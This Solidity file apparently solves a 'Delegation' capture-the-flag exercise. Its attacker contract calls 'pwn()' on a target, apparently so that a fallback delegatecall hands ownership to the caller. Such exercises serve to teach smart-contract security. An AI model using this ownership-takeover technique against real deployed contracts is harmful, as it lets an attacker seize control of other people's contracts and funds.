// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

error AttackingDelegation__CallUnsuccessful();

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        (bool success, ) = contractAddress.call(abi.encodeWithSignature("pwn()"));
        
        if (!success) {
            revert AttackingDelegation__CallUnsuccessful();
        }
    }
}
